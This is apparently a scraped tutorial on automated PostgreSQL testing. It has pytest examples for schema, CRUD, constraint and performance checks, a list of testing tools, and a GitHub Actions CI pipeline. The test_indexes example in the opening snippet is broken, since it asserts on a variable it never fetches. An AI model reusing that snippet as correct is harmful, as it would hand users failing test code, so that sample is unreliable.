def test_table_exists():
    conn = psycopg2.connect("dbname=test user=postgres")
    cursor = conn.cursor()
    
    # Test 1: Check table exists
    cursor.execute("""
        SELECT COUNT(*) FROM information_schema.tables 
        WHERE table_name = 'users'
    """)
    result = cursor.fetchone()
    assert result[0] == 1, "Users table should exist"
    
    # Test 2: Check required columns
    cursor.execute("""
        SELECT column_name, data_type, is_nullable
        FROM information_schema.columns 
        WHERE table_name = 'users'
        ORDER BY ordinal_position
    """)
    columns = cursor.fetchall()
    
    expected_columns = [
        ('id', 'integer', 'NO'),
        ('email', 'character varying', 'NO'),
        ('created_at', 'timestamp', 'NO')
    ]
    
    for i, (col_name, data_type, nullable) in enumerate(expected_columns):
        assert columns[i][0] == col_name, f"Column {col_name} missing"
        assert columns[i][2] == nullable, f"{col_name} nullable incorrect"
    
    cursor.close()
    conn.close()

def test_indexes():
    conn = psycopg2.connect("dbname=test user=postgres")
    cursor = conn.cursor()
    
    # Check index on email
    cursor.execute("""
        SELECT COUNT(*) FROM pg_indexes 
        WHERE tablename = 'users' 
          AND indexname LIKE '%email%'
    """)

    assert result[0] >= 1, "Missing index on email column"

content.title: Testing CRUD Operations
content.value:
CRUD (Create, Read, Update, Delete) operations form the backbone of most database interactions. Automated testing of these operations ensures that your application's basic data manipulation functions work correctly and reliably.

### Key Principles:
1. **Test Isolation**: Each test should be independent and not affect others
2. **Clean State**: Tests should clean up after themselves
3. **Transaction Safety**: Use transactions to prevent data pollution
4. **Assertion Coverage**: Verify both success and failure scenarios

examples.code:
import pytest
import psycopg2

def test_transaction_rollback():
    conn = psycopg2.connect("dbname=test user=postgres")
    cursor = conn.cursor()
    
    # Get initial count
    cursor.execute("SELECT COUNT(*) FROM users")
    initial_count = cursor.fetchone()[0]
    
    try:
        # Start transaction
        conn.autocommit = False
        
        # Insert a user
        cursor.execute("""
            INSERT INTO users (email, created_at) 
            VALUES (%s, NOW())
        """, ('rollback_test@example.com',))
        
        # Simulate an error
        raise Exception("Simulated error")
        
        # This shouldn't be reached
        conn.commit()
        
    except Exception:
        # Rollback on error
        conn.rollback()
        
    finally:
        conn.autocommit = True
    
    # Get final count
    cursor.execute("SELECT COUNT(*) FROM users")
    final_count = cursor.fetchone()[0]
    
    # Should be same as initial (transaction rolled back)
    assert final_count == initial_count, \
           "Count should be same after rollback"
    
    cursor.close()
    conn.close()

content.title: Ensuring Data Integrity
content.value:
Data integrity testing validates that your database maintains data accuracy, consistency, and reliability. This includes testing constraints, business rules, and data relationships to prevent data corruption.

### Types of Data Integrity:
1. **Entity Integrity**: Primary key constraints ensure each record is unique
2. **Referential Integrity**: Foreign key constraints maintain relationships between tables
3. **Domain Integrity**: Data type and check constraints ensure valid data values
4. **User-defined Integrity**: Business rules implemented through triggers or application logic

examples.title: Test Constraints
examples.code:
import pytest
import psycopg2

def test_unique_constraint():
    conn = psycopg2.connect("dbname=test user=postgres")
    cursor = conn.cursor()
    
    # Insert first user
    cursor.execute("""
        INSERT INTO users (email, created_at) 
        VALUES (%s, NOW())
    """, ('unique_test@example.com',))
    conn.commit()
    
    # Try to insert duplicate (should fail)
    try:
        cursor.execute("""
            INSERT INTO users (email, created_at) 
            VALUES (%s, NOW())
        """, ('unique_test@example.com',))
        conn.commit()
        assert False, "Should fail on duplicate email"
    except psycopg2.IntegrityError as e:
        # Expected - unique constraint violation
        assert "duplicate key" in str(e) or "unique" in str(e)
        conn.rollback()
    
    # Clean up
    cursor.execute("DELETE FROM users WHERE email = %s", 
                   ('unique_test@example.com',))
    conn.commit()
    
    cursor.close()
    conn.close()

def test_foreign_key_constraint():
    conn = psycopg2.connect("dbname=test user=postgres")
    cursor = conn.cursor()
    
    # Try to insert order with non-existent user (should fail)
    try:
        cursor.execute("""
            INSERT INTO orders (user_id, total_amount) 
            VALUES (%s, %s)
        """, (99999, 100.00))  # Non-existent user_id
        conn.commit()
        assert False, "Should fail on foreign key violation"
    except psycopg2.IntegrityError as e:
        # Expected - foreign key violation
        assert "foreign key" in str(e)
        conn.rollback()
    
    cursor.close()
    conn.close()

def test_not_null_constraint():
    conn = psycopg2.connect("dbname=test user=postgres")
    cursor = conn.cursor()
    
    # Try to insert user without email (should fail)
    try:
        cursor.execute("""
            INSERT INTO users (created_at) 
            VALUES (NOW())
        """)
        conn.commit()
        assert False, "Should fail on NOT NULL constraint"
    except psycopg2.IntegrityError as e:
        # Expected - not null violation
        assert "null" in str(e)
        conn.rollback()
    
    cursor.close()
    conn.close()

content.title: Testing Database Logic

Stored procedures and triggers encapsulate business logic within the database. Testing them ensures that complex data operations and automated behaviors work correctly.

### Key Testing Considerations:
1. **Parameter Validation**: Test with various input scenarios including edge cases
2. **Side Effects**: Verify all data changes made by the procedure/trigger
3. **Error Handling**: Test how errors are handled and reported
4. **Performance**: Ensure procedures execute efficiently
5. **Transaction Safety**: Verify proper transaction management

content.title: Managing Test Data Effectively
content.value:
Effective test data management is crucial for reliable database testing. The goal is to have consistent, isolated, and representative data for each test run.

### Key Strategies:
1. **Fresh Fixtures**: Small, specific datasets created per test
2. **Subset Cloning**: Production-like data (properly masked/anonymized)
3. **Synthetic Generation**: Realistic but fake data for testing
4. **Data Masking**: Protect sensitive information while maintaining referential integrity

### Best Practices:
- Use transactions for test isolation
- Implement proper cleanup mechanisms
- Generate data that covers edge cases
- Maintain data relationships and constraints

content.title: Performance Testing Fundamentals
content.value:
Database performance testing ensures your database can handle expected workloads efficiently. It helps identify bottlenecks, optimize queries, and establish performance baselines.

### Key Performance Indicators:
1. **Query Response Time**: How long individual queries take
2. **Throughput**: Number of queries processed per second
3. **Concurrency**: Performance under multiple simultaneous connections
4. **Resource Usage**: CPU, memory, and disk I/O utilization
5. **Scalability**: Performance as data volume increases

### Testing Approaches:
- **Baseline Testing**: Establish performance benchmarks
- **Load Testing**: Test under expected peak loads
- **Stress Testing**: Test beyond normal capacity
- **Endurance Testing**: Long-running tests to identify memory leaks or resource exhaustion

examples.title: Basic Performance Test
examples.code:
import time
import psycopg2

def test_query_performance():
    conn = psycopg2.connect("dbname=test user=postgres")
    cursor = conn.cursor()
    
    # Test 1: Simple query performance
    start_time = time.time()
    
    for _ in range(100):
        cursor.execute("SELECT * FROM users WHERE id = 1")
        cursor.fetchone()
    
    elapsed = time.time() - start_time
    print(f"Simple query 100x: {elapsed:.3f}s")
    
    # Should be reasonably fast
    assert elapsed < 1.0, f"Query too slow: {elapsed}s"
    
    # Test 2: Join query performance
    start_time = time.time()
    
    cursor.execute("""
        SELECT u.email, COUNT(o.id) as order_count
        FROM users u
        LEFT JOIN orders o ON u.id = o.user_id
        GROUP BY u.id, u.email
        LIMIT 50
    """)
    cursor.fetchall()
    
    elapsed = time.time() - start_time
    print(f"Join query: {elapsed:.3f}s")
    
    assert elapsed < 2.0, f"Join query too slow: {elapsed}s"
    
    cursor.close()
    conn.close()

def test_index_usage():
    """Check if queries use indexes"""
    conn = psycopg2.connect("dbname=test user=postgres")
    cursor = conn.cursor()
    
    # Use EXPLAIN to check query plan
    cursor.execute("EXPLAIN ANALYZE SELECT * FROM users WHERE email = 'test@example.com'")
    
    explain_result = cursor.fetchall()
    explain_text = '\n'.join([str(row) for row in explain_result])
    
    # Check if index scan is used
    if 'Index Scan' in explain_text or 'Index Only Scan' in explain_text:
        print("✓ Query uses index")
    else:
        print("✗ Query does not use index (might need optimization)")
        print(f"Query plan:\n{explain_text}")
    
    cursor.close()
    conn.close()

def test_concurrent_connections():
    """Test handling multiple connections"""
    connections = []
    
    try:
        # Open multiple connections
        for i in range(10):
            conn = psycopg2.connect("dbname=test user=postgres")
            connections.append(conn)
            
            # Do a simple query on each connection
            cursor = conn.cursor()
            cursor.execute("SELECT 1")
            cursor.close()
            
        print(f"✓ Successfully opened {len(connections)} connections")
        
    finally:
        # Close all connections
        for conn in connections:
            conn.close()

content.title: Database Testing Tooling Landscape
content.value:
### General-Purpose Testing Frameworks + Libraries

**Java Ecosystem**:
- **JUnit/TestNG** + **DBUnit**: For data setup/teardown and assertions
- **JOOQ**: Type-safe SQL query building and testing
- **Spring's @DataJpaTest**: Integration testing for JPA repositories
- **TestContainers**: Lightweight, throwaway database instances

**Python Ecosystem**:
- **pytest**: Flexible testing framework with rich plugin ecosystem
- **SQLAlchemy**: ORM-based testing with session management
- **Factory Boy**: Test data generation and management
- **pytest-postgresql**: PostgreSQL fixtures for pytest

**.NET Ecosystem**:
- **xUnit/NUnit**: Testing frameworks
- **Respawn**: Fast database resetting between tests
- **Dapper**: Micro-ORM for efficient data access testing
- **Entity Framework Core**: ORM with testing utilities

### Specialized Database Testing Tools

**Database-Specific Frameworks**:
- **tSQLt (SQL Server)**: Industry standard for unit testing in SQL
- **pgTAP (PostgreSQL)**: TAP-based testing framework for PostgreSQL
- **MySQL Test Framework**: MySQL's built-in testing framework
- **utPLSQL (Oracle)**: Unit testing framework for Oracle PL/SQL

**ETL/Data Pipeline Testing**:
- **dbt (data build tool)**: Built-in testing for data transformations
- **Great Expectations**: Data validation and quality testing
- **Airflow**: Workflow testing for data pipelines

**Performance Testing Tools**:
- **HammerDB**: TPC-based benchmarking tool
- **JMeter**: Load testing with JDBC samplers
- **Database-specific tools**: EXPLAIN ANALYZE, Query Store, Performance Insights

content.title: Writing Effective Automated DB Tests
content.value:
### The AAA Pattern (Arrange, Act, Assert)

**Arrange**: Set up test data and state
- Create necessary test data
- Configure database connections
- Establish baseline conditions

**Act**: Execute the operation
- Call stored procedures or functions
- Execute queries or updates
- Trigger database operations

**Assert**: Verify outcomes
- Check data changes
- Validate return values
- Verify side effects
- Confirm error handling

### Test Isolation Principles
- Each test must be independent
- Use transactions for cleanup
- Avoid shared state between tests
- Implement proper setup/teardown

### Focus on Behavior, Not Implementation
Test what the database does, not just that a column exists. Focus on:
- Business logic correctness
- Data integrity constraints
- Performance characteristics
- Error scenarios

### Example Test Cases
- Validating complex INSERT triggers
- Testing financial transaction stored procedures for rollback on error
- Verifying cascade delete operations
- Testing data migration scripts

content.title: Integrating Database Tests into CI/CD
content.value:
Continuous Integration and Continuous Deployment (CI/CD) pipelines should include database testing as a critical stage. This ensures that database changes are validated before deployment.

### Key Integration Points:
1. **Database Testing Stage**: Run database tests as part of the pipeline
2. **Database State Management**: Use migration tools (Flyway/Liquibase) to deploy and rollback
3. **Test Reporting**: Publish test results alongside application tests
4. **Performance Gates**: Set performance thresholds for query execution
5. **Security Scanning**: Include database security checks in the pipeline

### Pipeline Considerations:
- Use containerized databases for consistency
- Implement database versioning and migration testing
- Include data integrity checks in deployment validation
- Monitor test execution times and optimize as needed

examples.title: GitHub Actions Configuration
examples.code:
name: Database Testing Pipeline

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  database-tests:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:13
        env:
          POSTGRES_PASSWORD: postgres
          POSTGRES_DB: testdb
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
        ports:
          - 5432:5432
    
    steps:
    - name: Checkout code
      uses: actions/checkout@v3
      
    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.9'
        
    - name: Install dependencies
      run: |
        pip install -r requirements.txt
        pip install pytest psycopg2-binary faker
        
    - name: Wait for PostgreSQL
      run: |
        until pg_isready -h localhost -p 5432; do
          echo "Waiting for PostgreSQL..."
          sleep 2
        done
        
    - name: Setup test database
      run: |
        psql -h localhost -U postgres -d testdb -c "DROP SCHEMA public CASCADE; CREATE SCHEMA public;"
        psql -h localhost -U postgres -d testdb -f schema.sql
        
    - name: Run structure tests
      run: |
        python -m pytest tests/structure_tests.py -v
        
    - name: Run CRUD tests
      run: |
        python -m pytest tests/crud_tests.py -v
        
    - name: Run integrity tests
      run: |
        python -m pytest tests/integrity_tests.py -v
        
    - name: Run performance tests
      run: |
        python -m pytest tests/performance_tests.py -v
        
    - name: Generate test report
      run: |
        python -m pytest --junitxml=test-results.xml
        
    - name: Upload test results
      uses: actions/upload-artifact@v3
      if: always()
      with:
        name: test-results
        path: test-results.xml
        
    - name: Upload coverage report
      uses: codecov/codecov-action@v3
      with:
        file: ./coverage.xml
